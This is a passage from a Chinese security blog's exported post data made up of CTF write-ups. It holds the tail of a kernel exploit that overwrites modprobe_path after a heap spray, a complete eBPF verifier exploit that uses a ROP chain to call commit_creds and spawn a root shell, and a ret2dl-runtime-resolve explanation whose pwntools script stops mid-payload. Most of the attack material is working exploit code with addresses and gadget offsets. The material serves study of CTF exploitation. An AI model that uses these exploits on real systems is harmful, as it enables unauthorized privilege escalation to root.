sleeping now...&quot;);        del(0);        puts(&quot;[\\033[34m\\033[1m*\\033[0m] Child process started.&quot;);        exit(0);    &#125;    else    &#123;        puts(&quot;[\\033[34m\\033[1m*\\033[0m] trapped in userfaultfd&quot;);        edit(0, 0x202, page);    &#125;    finish_t = clock() - start_t;    printf(&quot;gap:%d\\n&quot;, finish_t);    memset(sk_buf, 0, 704);    for (int i = 0; i &lt; SOCKET_NUM; i++)    &#123;        for (int j = 0; j &lt; SK_BUFF_NUM; j++)        &#123;            if (write(sk_sockets[i][0], sk_buf, sizeof(sk_buf)) &lt; 0)            &#123;                errExit(&quot;failed to spray sk_buff!&quot;);            &#125;        &#125;    &#125;    puts(&quot;[+] spray sk_buff success&quot;);    for (int i = 0; i &lt; PIPE_NUM; i++)    &#123;        if (pipe(pipe_fd[i]) &lt; 0)            errExit(&quot;failed to create pipe!&quot;);        if (write(pipe_fd[i][1], &quot;196082&quot;, 6) &lt; 0)            errExit(&quot;failed to write the pipe!&quot;);    &#125;    puts(&quot;[+] spray pipe_buffer success&quot;);    pipe_buf_ptr = (struct pipe_buffer *)&amp;sk_buf;    for (int i = 0; i &lt; SOCKET_NUM; i++)    &#123;        for (int j = 0; j &lt; SK_BUFF_NUM; j++)        &#123;            if (read(sk_sockets[i][1], &amp;sk_buf, sizeof(sk_buf)) &lt; 0)                errExit(&quot;failed to release sk_buff!&quot;);            puts(&quot;[*] read success!&quot;);            // print_hex(sk_buf, 0x2c0);            if (pipe_buf_ptr-&gt;ops &gt; 0xffffffff81000000)            &#123;                printf(&quot;\\033[32m\\033[1m[+] got pipe_buf_ops: \\033[0m%p\\n&quot;,                       pipe_buf_ptr-&gt;ops);                kernel_addr = (unsigned long *)pipe_buf_ptr-&gt;ops;                kernel_base = (kernel_addr - 0x103ed80);                kernel_offset = kernel_base - 0xffffffff81000000;            &#125;        &#125;    &#125;    if (kernel_addr == NULL)    &#123;        printf(&quot;[-] leak error!\\n&quot;);        exit(-1);    &#125;    printf(&quot;\\033[32m\\033[1m[+] kernel base: \\033[0m%p \\033[32m\\033[1moffset: \\033[0m%p\\n&quot;,           kernel_base, kernel_offset);    modprobe_path = kernel_offset + 0xffffffff82a6c000 - 0xe0;    add(buf);    close(pipe_fd[0][0]);    close(pipe_fd[0][1]);    *(unsigned long *)((char *)buf + 0x200) = modprobe_path;    edit(0, 0x300, buf);    if (write(sk_sockets[0][0], sk_buf, sizeof(sk_buf)) &lt; 0)    &#123;        errExit(&quot;failed to spray sk_buff!&quot;);    &#125;    memset(sk_buf, 0, sizeof(sk_buf));    pointer_buf = (unsigned long *)&amp;sk_buf;    pointer_buf[0] = kernel_offset + 0xffffffff82382ba7;    pointer_buf[1] = kernel_offset + 0xffffffff82382bae;    pointer_buf[2] = kernel_offset + 0xffffffff823a20e0;    pointer_buf[4] = 0x000004e200000000;    pointer_buf[5] = 0xa;    pointer_buf[12] = 0x000004e200000000;    pointer_buf[13] = 0xa;    pointer_buf[20] = 0x000004e200000000;    pointer_buf[21] = 0xa;    strcpy(sk_buf + 0xe0, &quot;/tmp/copy.sh&quot;);    pointer_buf[61] = kernel_offset + 0xffffffff82a6c108;    pointer_buf[62] = kernel_offset + 0xffffffff82a6c108;    pointer_buf[63] = 0x32;    if (write(sk_sockets[0][0], sk_buf, sizeof(sk_buf)) &lt; 0)    &#123;        errExit(&quot;failed to spray sk_buff!&quot;);    &#125;    printf(&quot;[*] modprobe_path addr=&gt;%p\\n&quot;, modprobe_path + 0xe0);    for (int i = 0; i &lt; PIPE_NUM2; i++)    &#123;        close(pipe_fd2[i][0]);        close(pipe_fd2[i][1]);    &#125;    system(&quot;/tmp/dummy&quot;);    flag_fd = open(&quot;/tmp/myflag&quot;, O_RDWR);    if (flag_fd &lt; 0)        printf(&quot;FAILED to hijack!&quot;);    read(flag_fd, flag, 0x100);    write(1, flag, 0x100);    printf(&quot;\\n&quot;);    // del(0);    sleep(10);    return 0;&#125;\n\n\n补充一下根据exp可以可能会存在以这样一个疑问：为什么开始要申请16个pipe_buffer结构体？\n上面这个问题我依稀记得我在某篇文章提到过，不过我也没找到，所以这里再做一下解释。在最后利用时我们就已经破坏掉了slab的freelist链表了，但是系统会继续申请很多堆块，所以我们所做的算是保证在申请0x400size的object的时候不会发生kernel panic。\n\n题目链接：https://github.com/196082/196082/blob/main/kernel_pwn/cactus.zip\n","categories":["Linux Kernel"],"tags":["sk_buff","pipe_buffer","userfaultfd","modprobe_path"]},{"title":"d3bpf-v2","url":"/2023/01/11/d3bpf-v2/","content":"因为近期一直在玩内核，在把这篇文章写完之后就不会一直更新内核相关的了，后续的打算是学习完逃逸的内容之后就开始进行刷题和复现比赛的练习了。\n分析题目首先，这道题的大致跟上一道题目一样，存在一个patch\ndiff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.cindex 40d92628e..be9cdde7a 100644--- a/kernel/bpf/verifier.c+++ b/kernel/bpf/verifier.c@@ -8100,11 +8100,11 @@ static int adjust_scalar_min_max_vals(struct bpf_verifier_env *env, \t\t\tscalar_min_max_lsh(dst_reg, &amp;src_reg); \t\tbreak; \tcase BPF_RSH:-\t\tif (umax_val &gt;= insn_bitness) &#123;-\t\t\t/* Shifts greater than 31 or 63 are undefined.-\t\t\t * This includes shifts by a negative number.-\t\t\t */-\t\t\tmark_reg_unknown(env, regs, insn-&gt;dst_reg);+\t\tif (umin_val &gt;= insn_bitness) &#123;+\t\t\tif (alu32)+\t\t\t\t__mark_reg32_known(dst_reg, 0);+\t\t\telse+\t\t\t\t__mark_reg_known_zero(dst_reg); \t\t\tbreak; \t\t&#125; \t\tif (alu32)\n\n可以看出来这里的patch跟前面一道题一样，在RSH中设置了超过指定大小的数时会设置为known的0。\n不同的是这里题目使用的内核版本是5.16.12+，而在新版本的内核中存在新的检测机制：\n\n  任何指针只能进行加减操作，不能进行比较（防止侧信道）\n  在进行指针与寄存器操作时，verfier会将已知的寄存器替换为常数进行计算。\n\n所以这也就造成了前面的攻击手法无效了。\n利用分析这里出现了一个新的函数bpf_skb_load_bytes可以进行绕过\nBPF_CALL_4(bpf_skb_load_bytes, const struct sk_buff *, skb, u32, offset,\t   void *, to, u32, len)&#123;\tvoid *ptr;\tif (unlikely(offset &gt; 0xffff))\t\tgoto err_clear;\tptr = skb_header_pointer(skb, offset, len, to);\tif (unlikely(!ptr))\t\tgoto err_clear;\tif (ptr != to)\t\tmemcpy(to, ptr, len);\treturn 0;err_clear:\tmemset(to, 0, len);\treturn -EFAULT;&#125;\n\n这个函数的作用是读取socket缓冲区到指定的位置，在ebpf程序中可以是栈或者map。\n然而因为patch的缘故我们可以很轻松的实现栈溢出。\n泄漏地址这里leak的方法延用作者的方法。\n在新版本内核中ebpf程序crash并不会造成内核的崩溃，当/proc/sys/kernel/panic_on_oops 值为 0 时 soft panic 并不会直接 panic。似乎在默认情况下其值就是 0，如 Ubuntu20.04。而在kernel pwn题目中想出现上述情况的方法是在qemu启动项中添加 oops = panic。而在发生soft panic时会打印出来内核地址。所以这里选择这样使用，使ebpf程序出现crash紧接着就会打印出地址即可。\n提权这里因为可以很简单的进行栈溢出所以就不多赘述了。所以直接给出exp\nexp#define _GNU_SOURCE#include &lt;err.h&gt;#include &lt;inttypes.h&gt;#include &lt;sched.h&gt;#include &lt;net/if.h&gt;#include &lt;netinet/in.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/msg.h&gt;#include &lt;sys/socket.h&gt;#include &lt;stdint.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdio.h&gt;#include &lt;linux/userfaultfd.h&gt;#include &lt;pthread.h&gt;#include &lt;errno.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;fcntl.h&gt;#include &lt;signal.h&gt;#include &lt;string.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;sys/sem.h&gt;#include &lt;semaphore.h&gt;#include &lt;poll.h&gt;#include &lt;time.h&gt;#include &lt;linux/bpf_common.h&gt;#include &lt;sys/types.h&gt;#include &lt;linux/bpf.h&gt;#ifndef _BPF_DEFS_H_#define _BPF_DEFS_H_#define BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM) \\    ((struct bpf_insn)&#123;                        \\        .code = CODE,                          \\        .dst_reg = DST,                        \\        .src_reg = SRC,                        \\        .off = OFF,                            \\        .imm = IMM&#125;)#define BPF_LD_IMM64_RAW(DST, SRC, IMM)              \\    ((struct bpf_insn)&#123;                              \\        .code = BPF_LD | BPF_DW | BPF_IMM,           \\        .dst_reg = DST,                              \\        .src_reg = SRC,                              \\        .off = 0,                                    \\        .imm = (__u32)(IMM)&#125;),                       \\        ((struct bpf_insn)&#123;                          \\            .code = 0, /* zero is reserved opcode */ \\            .dst_reg = 0,                            \\            .src_reg = 0,                            \\            .off = 0,                                \\            .imm = ((__u64)(IMM)) &gt;&gt; 32&#125;)/* Memory load, dst_reg = *(uint *) (src_reg + off16) */#define BPF_LDX_MEM(SIZE, DST, SRC, OFF)            \\    ((struct bpf_insn)&#123;                             \\        .code = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM, \\        .dst_reg = DST,                             \\        .src_reg = SRC,                             \\        .off = OFF,                                 \\        .imm = 0&#125;)/* Memory store, *(uint *) (dst_reg + off16) = src_reg */#define BPF_STX_MEM(SIZE, DST, SRC, OFF)            \\    ((struct bpf_insn)&#123;                             \\        .code = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM, \\        .dst_reg = DST,                             \\        .src_reg = SRC,                             \\        .off = OFF,                                 \\        .imm = 0&#125;)/* Conditional jumps against immediates, if (dst_reg &#x27;op&#x27; imm32) goto pc + off16 */#define BPF_JMP_IMM(OP, DST, IMM, OFF)        \\    ((struct bpf_insn)&#123;                       \\        .code = BPF_JMP | BPF_OP(OP) | BPF_K, \\        .dst_reg = DST,                       \\        .src_reg = 0,                         \\        .off = OFF,                           \\        .imm = IMM&#125;)/* Like BPF_JMP_IMM, but with 32-bit wide operands for comparison. */#define BPF_JMP32_IMM(OP, DST, IMM, OFF)        \\    ((struct bpf_insn)&#123;                         \\        .code = BPF_JMP32 | BPF_OP(OP) | BPF_K, \\        .dst_reg = DST,                         \\        .src_reg = 0,                           \\        .off = OFF,                             \\        .imm = IMM&#125;)/* Short form of mov, dst_reg = imm32 */#define BPF_MOV64_IMM(DST, IMM)              \\    ((struct bpf_insn)&#123;                      \\        .code = BPF_ALU64 | BPF_MOV | BPF_K, \\        .dst_reg = DST,                      \\        .src_reg = 0,                        \\        .off = 0,                            \\        .imm = IMM&#125;)#define BPF_MOV32_IMM(DST, IMM)            \\    ((struct bpf_insn)&#123;                    \\        .code = BPF_ALU | BPF_MOV | BPF_K, \\        .dst_reg = DST,                    \\        .src_reg = 0,                      \\        .off = 0,                          \\        .imm = IMM&#125;)/* Short form of mov, dst_reg = src_reg */#define BPF_MOV64_REG(DST, SRC)              \\    ((struct bpf_insn)&#123;                      \\        .code = BPF_ALU64 | BPF_MOV | BPF_X, \\        .dst_reg = DST,                      \\        .src_reg = SRC,                      \\        .off = 0,                            \\        .imm = 0&#125;)#define BPF_MOV32_REG(DST, SRC)            \\    ((struct bpf_insn)&#123;                    \\        .code = BPF_ALU | BPF_MOV | BPF_X, \\        .dst_reg = DST,                    \\        .src_reg = SRC,                    \\        .off = 0,                          \\        .imm = 0&#125;)/* ALU ops on immediates, bpf_add|sub|...: dst_reg += imm32 */#define BPF_ALU64_IMM(OP, DST, IMM)             \\    ((struct bpf_insn)&#123;                         \\        .code = BPF_ALU64 | BPF_OP(OP) | BPF_K, \\        .dst_reg = DST,                         \\        .src_reg = 0,                           \\        .off = 0,                               \\        .imm = IMM&#125;)/* ALU ops on registers, bpf_add|sub|...: dst_reg += src_reg */#define BPF_ALU64_REG(OP, DST, SRC)             \\    ((struct bpf_insn)&#123;                         \\        .code = BPF_ALU64 | BPF_OP(OP) | BPF_X, \\        .dst_reg = DST,                         \\        .src_reg = SRC,                         \\        .off = 0,                               \\        .imm = 0&#125;)/* Program exit */#define BPF_EXIT_INSN()             \\    ((struct bpf_insn)&#123;             \\        .code = BPF_JMP | BPF_EXIT, \\        .dst_reg = 0,               \\        .src_reg = 0,               \\        .off = 0,                   \\        .imm = 0&#125;)/* BPF_LD_IMM64 macro encodes single &#x27;load 64-bit immediate&#x27; insn */#define BPF_LD_IMM64(DST, IMM) \\    BPF_LD_IMM64_RAW(DST, 0, IMM)/* pseudo BPF_LD_IMM64 insn used to refer to process-local map_fd */#define BPF_LD_MAP_FD(DST, MAP_FD) \\    BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)// varies from userspace bpf_map_info definition so need to redefinestruct bpf_map_info_kernel&#123;    __u32 type;    __u32 id;    __u32 key_size;    __u32 value_size;    __u32 max_entries;    __u32 map_flags;    char name[BPF_OBJ_NAME_LEN];    __u32 ifindex;    __u32 btf_vmlinux_value_type_id;    __u64 netns_dev;    __u64 netns_ino;    __u32 btf_id;    __u32 btf_key_type_id;    __u32 btf_value_type_id;&#125; __attribute__((aligned(8)));#endifint bpf(int cmd, union bpf_attr *attrs)&#123;    return syscall(__NR_bpf, cmd, attrs, sizeof(*attrs));&#125;int create_map(union bpf_attr *map_attrs)&#123;    return bpf(BPF_MAP_CREATE, map_attrs);&#125;int update_map_element(int fd, uint64_t key, void *value, uint64_t flags)&#123;    union bpf_attr attr = &#123;&#125;;    attr.map_fd = fd;    attr.key = (uint64_t)&amp;key;    attr.value = (uint64_t)value;    attr.flags = flags;    return bpf(BPF_MAP_UPDATE_ELEM, &amp;attr);&#125;int lookup_map_element(int fd, uint64_t key, void *value)&#123;    union bpf_attr attr = &#123;&#125;;    attr.map_fd = fd;    attr.key = (uint64_t)&amp;key;    attr.value = (uint64_t)value;    return bpf(BPF_MAP_LOOKUP_ELEM, &amp;attr);&#125;int obj_get_info_by_fd(union bpf_attr *attrs)&#123;    return bpf(BPF_OBJ_GET_INFO_BY_FD, attrs);&#125;int map_get_next_key(union bpf_attr *attrs)&#123;    return bpf(BPF_MAP_GET_NEXT_KEY, attrs);&#125;int run_bpf_prog(struct bpf_insn *insn, uint32_t cnt, int *prog_fd_out, char *write_buf, size_t write_nbytes)&#123;    int ret = -1;    int prog_fd = -1;    char verifier_log_buff[0x200000] = &#123;0&#125;;    int socks[2] = &#123;0&#125;;    union bpf_attr prog_attrs =        &#123;            .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,            .insn_cnt = cnt,            .insns = (uint64_t)insn,            .license = (uint64_t) &quot;&quot;,            .log_level = 2,            .log_size = sizeof(verifier_log_buff),            .log_buf = (uint64_t)verifier_log_buff&#125;;    if (NULL != prog_fd_out)    &#123;        prog_fd = *prog_fd_out;    &#125;    if (0 &gt;= prog_fd)    &#123;        prog_fd = bpf(BPF_PROG_LOAD, &amp;prog_attrs);    &#125;    if (0 &gt; prog_fd)    &#123;        puts(verifier_log_buff);        goto done;    &#125;    if (0 != socketpair(AF_UNIX, SOCK_DGRAM, 0, socks))    &#123;        goto done;    &#125;    if (0 != setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &amp;prog_fd, sizeof(int)))    &#123;        goto done;    &#125;    if (write_nbytes != write(socks[1], write_buf, write_nbytes))    &#123;        printf(&quot;[!] write not so good\\n&quot;);        goto done;    &#125;    if (NULL != prog_fd_out)    &#123;        *prog_fd_out = prog_fd;    &#125;    else    &#123;        close(prog_fd);    &#125;    ret = 0;done:    close(socks[0]);    close(socks[1]);    return ret;&#125;size_t user_cs, user_ss, user_sp, user_rflags;void save_status()&#123;    __asm__(        &quot;mov user_cs, cs;&quot;        &quot;mov user_ss, ss;&quot;        &quot;mov user_sp, rsp;&quot;        &quot;pushf;&quot;        &quot;pop user_rflags;&quot;);    puts(&quot;[*]status has been saved.&quot;);&#125;void err_exit(char *err_msg)&#123;    puts(err_msg);    exit(-1);&#125;void get_shell()&#123;    if (getuid())    &#123;        printf(&quot;\\033[31m\\033[1m[x] Failed to get the root!\\033[0m\\n&quot;);        exit(-1);    &#125;    printf(&quot;\\033[32m\\033[1m[+] Successful to get the root. Execve root shell now...\\033[0m\\n&quot;);    system(&quot;/bin/sh&quot;);&#125;#define EXP_REG BPF_REG_8#define attack()                                    \\    BPF_MOV64_IMM(BPF_REG_9, 64),                   \\        BPF_MOV64_IMM(EXP_REG, 1),                  \\        BPF_ALU64_REG(BPF_RSH, EXP_REG, BPF_REG_9), \\        BPF_MOV64_REG(BPF_REG_0, EXP_REG)int main(int argc, char *argv[])&#123;    if (argc == 1)    &#123;        struct bpf_insn leak_insn[] = &#123;            attack(),            BPF_ALU64_IMM(BPF_MUL, EXP_REG, (16 - 8)),            BPF_MOV64_IMM(BPF_REG_2, 0),            BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),            BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, -8),            BPF_MOV64_IMM(BPF_REG_4, 8),            BPF_ALU64_REG(BPF_ADD, BPF_REG_4, EXP_REG),            BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_skb_load_bytes),            BPF_EXIT_INSN()&#125;;        char buf[0x100];        memset(buf, 0xFF, sizeof(buf));        if (0 != run_bpf_prog(leak_insn, sizeof(leak_insn) / sizeof(struct bpf_insn), NULL, buf, 0x100))        &#123;            err_exit(&quot;[-] Failed to run bpf program\\n&quot;);        &#125;    &#125;    if (argc == 2)    &#123;        save_status();        signal(SIGSEGV, &amp;get_shell);        unsigned long kernel_offset = strtoul(argv[1], NULL, 16);        printf(&quot;[+] kernel offset: %p\\n&quot;, kernel_offset);        unsigned long commit_creds = kernel_offset + 0xffffffff810d7210;        unsigned long init_cred = kernel_offset + 0xffffffff82e6e860;        unsigned long pop_rdi_ret = kernel_offset + 0xffffffff81097050;        unsigned long swapgs_restore_regs_and_return_to_usermode = kernel_offset + 0xffffffff81e0100b;        unsigned long rop_chain[0x100];        int i = 0;        rop_chain[i++] = 0xDEADBEEF;        rop_chain[i++] = 0xDEADBEEF;        rop_chain[i++] = pop_rdi_ret;        rop_chain[i++] = init_cred;        rop_chain[i++] = commit_creds;        rop_chain[i++] = swapgs_restore_regs_and_return_to_usermode;        rop_chain[i++] = 0;        rop_chain[i++] = 0;        rop_chain[i++] = &amp;get_shell;        rop_chain[i++] = user_cs;        rop_chain[i++] = user_rflags;        rop_chain[i++] = user_sp;        rop_chain[i++] = user_ss;        struct bpf_insn attack_insn[] = &#123;            attack(),            BPF_ALU64_IMM(BPF_MUL, EXP_REG, (0x100 - 8)),            BPF_MOV64_IMM(BPF_REG_2, 0),            BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),            BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, -8),            BPF_MOV64_IMM(BPF_REG_4, 8),            BPF_ALU64_REG(BPF_ADD, BPF_REG_4, EXP_REG),            BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_skb_load_bytes),            BPF_EXIT_INSN()&#125;;        if (0 != run_bpf_prog(attack_insn, sizeof(attack_insn) / sizeof(struct bpf_insn), NULL, rop_chain, 0x100))        &#123;            err_exit(&quot;[-] Failed to run bpf program\\n&quot;);        &#125;    &#125;&#125;\n\n\n首先运行exp触发soft panic可以看到在其中存在酷似kernel代码段的地址信息，所以我们可以通过计算得到kernel_offset\n\n\n最后成功提权。\n\n题目放在:https://github.com/196082/196082/blob/main/kernel_pwn/d3bpf-v2.zip\n","categories":["Linux Kernel"],"tags":["ebpf"]},{"title":"dl-runtime-resolve重温","url":"/2023/07/28/dl-runtime-resolve/","content":"前言在先前其实我已经写过一篇ret2dl-runtime-resolve了。不过在那篇文章中并没有提到当RELRO的等级为FULL的情况下该如何进行利用方法。又因为这类题目一般来说就是模板题目的缘故所以我也就一直没有放在心上，直到这一次巅峰极客遇到了这样一道题目。事先需要提到的是，这道题其实是具有更简单的解题方法的，那就是将got表中read的函数地址写到bss中，随后修改便宜直接调用syscall即可。不过既然取名叫link_map也导致我头铁到一直尝试_dl_runtime_resolve的方式去解决，所以后续的题目都没看。\n因为内核玩的比较多，所以下来看了那一道内核题，题目给的驱动是没有漏洞的，但是因为没有加任何锁的缘故并且内核版本为5.10.x所以可以直接使用堆占位技术直接造成UAF，还算是比较简单，所以不会单独写文章进行复现。\n利用原理Full和Partial的区别首先最直接的区别就是在Full的情况下got表是不可写的，并且所有符号的在在开始时就会被解析，.got.plt段会被完全初始化为目标函数的最终地址。这也就导致link_map和_dl_runtime_resolve不会被加载。所以首先需要的就是泄漏出link_map和_dl_runtime_resolve函数。\n利用的必要条件一、栈溢出\n二、存在一个任意地址读取并且能写到任意地址\n其实有了如上条件之后依旧可以选择的更简单的方式就是读取got表中read函数的地址，并且进行partial write使其最终指向syscall。\n获取link_mapLOAD:0000000000600E10 0C 00 00 00 00 00 00 00 B0 04+Elf64_Dyn &lt;0Ch, 4004B0h&gt;                ; DT_INITLOAD:0000000000600E20 0D 00 00 00 00 00 00 00 F4 07+Elf64_Dyn &lt;0Dh, 4007F4h&gt;                ; DT_FINILOAD:0000000000600E30 19 00 00 00 00 00 00 00 E8 0D+Elf64_Dyn &lt;19h, 600DE8h&gt;                ; DT_INIT_ARRAYLOAD:0000000000600E40 1B 00 00 00 00 00 00 00 08 00+Elf64_Dyn &lt;1Bh, 8&gt;                      ; DT_INIT_ARRAYSZLOAD:0000000000600E50 1A 00 00 00 00 00 00 00 F0 0D+Elf64_Dyn &lt;1Ah, 600DF0h&gt;                ; DT_FINI_ARRAYLOAD:0000000000600E60 1C 00 00 00 00 00 00 00 08 00+Elf64_Dyn &lt;1Ch, 8&gt;                      ; DT_FINI_ARRAYSZLOAD:0000000000600E70 F5 FE FF 6F 00 00 00 00 98 02+Elf64_Dyn &lt;6FFFFEF5h, 400298h&gt;          ; DT_GNU_HASHLOAD:0000000000600E80 05 00 00 00 00 00 00 00 78 03+Elf64_Dyn &lt;5, 400378h&gt;                  ; DT_STRTABLOAD:0000000000600E90 06 00 00 00 00 00 00 00 D0 02+Elf64_Dyn &lt;6, 4002D0h&gt;                  ; DT_SYMTABLOAD:0000000000600EA0 0A 00 00 00 00 00 00 00 64 00+Elf64_Dyn &lt;0Ah, 64h&gt;                    ; DT_STRSZLOAD:0000000000600EB0 0B 00 00 00 00 00 00 00 18 00+Elf64_Dyn &lt;0Bh, 18h&gt;                    ; DT_SYMENTLOAD:0000000000600EC0 15 00 00 00 00 00 00 00 00 00+Elf64_Dyn &lt;15h, 0&gt;                      ; DT_DEBUGLOAD:0000000000600ED0 03 00 00 00 00 00 00 00 C0 0F+Elf64_Dyn &lt;3, 600FC0h&gt;                  ; DT_PLTGOTLOAD:0000000000600EE0 07 00 00 00 00 00 00 00 20 04+Elf64_Dyn &lt;7, 400420h&gt;                  ; DT_RELALOAD:0000000000600EF0 08 00 00 00 00 00 00 00 90 00+Elf64_Dyn &lt;8, 90h&gt;                      ; DT_RELASZLOAD:0000000000600F00 09 00 00 00 00 00 00 00 18 00+Elf64_Dyn &lt;9, 18h&gt;                      ; DT_RELAENTLOAD:0000000000600F10 18 00 00 00 00 00 00 00 00 00+Elf64_Dyn &lt;18h, 0&gt;                      ; DT_BIND_NOWLOAD:0000000000600F20 FB FF FF 6F 00 00 00 00 01 00+Elf64_Dyn &lt;6FFFFFFBh, 1&gt;                ; DT_FLAGS_1LOAD:0000000000600F30 FE FF FF 6F 00 00 00 00 F0 03+Elf64_Dyn &lt;6FFFFFFEh, 4003F0h&gt;          ; DT_VERNEEDLOAD:0000000000600F40 FF FF FF 6F 00 00 00 00 01 00+Elf64_Dyn &lt;6FFFFFFFh, 1&gt;                ; DT_VERNEEDNUMLOAD:0000000000600F50 F0 FF FF 6F 00 00 00 00 DC 03+Elf64_Dyn &lt;6FFFFFF0h, 4003DCh&gt;          ; DT_VERSYMLOAD:0000000000600F60 00 00 00 00 00 00 00 00 00 00+Elf64_Dyn &lt;0&gt;                           ; DT_NULL\n\n在入口处存在一个.dynmic叫做DT_DEBUG，由调试器使用。\ntypedef struct&#123;  Elf64_Sxword\td_tag;\t\t\t/* Dynamic entry type */  union    &#123;      Elf64_Xword d_val;\t\t/* Integer value */      Elf64_Addr d_ptr;\t\t\t/* Address value */    &#125; d_un;&#125; Elf64_Dyn;\n\n这里的d_ptr位置只想的是r_debug结构体。\nstruct r_debug  &#123;    /* Version number for this protocol.  It should be greater than 0.  */    int r_version;    struct link_map *r_map;\t/* Head of the chain of loaded objects.  */    /* This is the address of a function internal to the run-time linker,       that will always be called when the linker begins to map in a       library or unmap it, and again when the mapping change is complete.       The debugger can set a breakpoint at this address if it wants to       notice shared object mapping changes.  */    ElfW(Addr) r_brk;    enum      &#123;\t/* This state value describes the mapping change taking place when\t   the `r_brk&#x27; address is called.  */\tRT_CONSISTENT,\t\t/* Mapping change is complete.  */\tRT_ADD,\t\t\t/* Beginning to add a new object.  */\tRT_DELETE\t\t/* Beginning to remove an object mapping.  */      &#125; r_state;    ElfW(Addr) r_ldbase;\t/* Base address the linker is loaded at.  */  &#125;;\n\n可以看到中间的r_map就是指向link_map的地址了。\n获得_dl_runtime_resolvestruct link_map  &#123;    /* These first few members are part of the protocol with the debugger.       This is the same format used in SVR4.  */    ElfW(Addr) l_addr;\t\t/* Difference between the address in the ELF\t\t\t\t   file and the addresses in memory.  */    char *l_name;\t\t/* Absolute file name object was found in.  */    ElfW(Dyn) *l_ld;\t\t/* Dynamic section of the shared object.  */    struct link_map *l_next, *l_prev; /* Chain of loaded objects.  */  &#125;;\n\n可以看出来link_map其实是一个双向链表的形式，而且其中存在一个相当有用的成员l_info。而其中的DT_PLTGOT的d_tag存放的是got表的地址，那么可以经过多次的l_next的查找得到libc的got表地址进而获得_dl_runtime_resolve\npwndbg&gt; p/x *((struct link_map*)0x7fd64bb592e0)-&gt;l_next-&gt;l_next-&gt;l_info[3]$13 = &#123;  d_tag = 0x3,  d_un = &#123;    d_val = 0x7fd64bb05000,    d_ptr = 0x7fd64bb05000  &#125;&#125;pwndbg&gt; telescope 0x7fd64bb0500000:0000│  0x7fd64bb05000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x218bc001:0008│  0x7fd64bb05008 (_GLOBAL_OFFSET_TABLE_+8) —▸ 0x7fd64bb1c160 —▸ 0x7fd64b8ec000 ◂— 0x3010102464c457f02:0010│  0x7fd64bb05010 (_GLOBAL_OFFSET_TABLE_+16) —▸ 0x7fd64bb33c60 (_dl_runtime_resolve_xsave) ◂— endbr6403:0018│  0x7fd64bb05018 (*ABS*@got.plt) —▸ 0x7fd64ba89b20 (__strnlen_avx2) ◂— endbr6404:0020│  0x7fd64bb05020 (*ABS*@got.plt) —▸ 0x7fd64ba85750 (__rawmemchr_avx2) ◂— endbr6405:0028│  0x7fd64bb05028 (realloc@got.plt) —▸ 0x7fd64b914030 ◂— endbr6406:0030│  0x7fd64bb05030 (*ABS*@got.plt) —▸ 0x7fd64ba87970 (__strncasecmp_avx) ◂— endbr6407:0038│  0x7fd64bb05038 (_dl_exception_create@got.plt) —▸ 0x7fd64b914050 ◂— endbr64\n\n可以看到_dl_runtime_resolve_xsave函数就在偏移为0x10的位置了。\n例题题目分析__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123;  char buf[16]; // [rsp+0h] [rbp-10h] BYREF  sub_40071B();  read(0, buf, 0x100uLL);  return 0LL;&#125;\n\n题目的代码很简单，main函数就只有这几行代码，并且没有任何输出函数。\n__int64 __fastcall sub_400606(unsigned int a1, int a2, int a3)&#123;  __int64 result; // rax  __int64 v4; // [rsp+14h] [rbp-8h]  v4 = *(_QWORD *)(qword_601040 + (int)a1);  qword_601040 = v4;  result = a1;  dword_601048 = a1;  if ( a2 == 1 )  &#123;    result = v4;    qword_601028[a3] = v4;  &#125;  else if ( !a2 )  &#123;    result = v4;    qword_601020[a3] = v4;  &#125;  return result;&#125;\n\n这一段函数则是刚好满足第二个函数，能够实现任意地址读取之后写入到任意地址。\nexp因为前面已经提到了利用原理，这里就不多赘述直接上exp吧。\n因为我的exp是边打边写的，所以写得像一坨shit所以我在每一步都加了注释方便理解。\nfrom pwn import *elf = ELF(&#x27;./ezzzz&#x27;)r = process(&#x27;./ezzzz&#x27;)context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]context.arch = &#x27;amd64&#x27;pop_rdi = 0x00000000004007e3pop_rsi_r15 = 0x00000000004007e1bss = 0x601040read_plt = elf.plt[&#x27;read&#x27;]main_addr = 0x400740gadget_for_read = 0x400606gadget_for_write = 0x40067Cgadget_csu = 0x4007DA# 构造成read一次之后返回到mainpayload = flat(b&#x27;a&#x27;*0x18, pop_rdi, 0, pop_rsi_r15, bss, 0, read_plt, main_addr)payload = payload.ljust(0x100, b&#x27;\\x00&#x27;)r.send(payload)sleep(0.5)# 在固定位置写上经过csu之后需要跳转的函数位置r.sendline(flat(bss + 0x10, gadget_for_read, 0xBEEFDEAD))sleep(0.5)# 通过csu调用到gadget_for_read，目的是将BEEDDEAD读取到0x601030payload = flat(b&#x27;a&#x27;*0x18, gadget_csu, 0, 1, bss + 8, 1,               1, 0, 0x4007C0, b&#x27;a&#x27;*0x8*7, main_addr)payload = payload.ljust(0x100, b&#x27;\\x00&#x27;)r.send(payload)sleep(0.5)# 一样的为后续做准备，这里将0x601050和0x601040的指设置为(0x600EC0 + 0x8)也就是DT_DEBUGpayload = flat(b&#x27;a&#x27;*0x18, pop_rdi, 0, pop_rsi_r15, bss, 0, read_plt, main_addr)payload = payload.ljust(0x100, 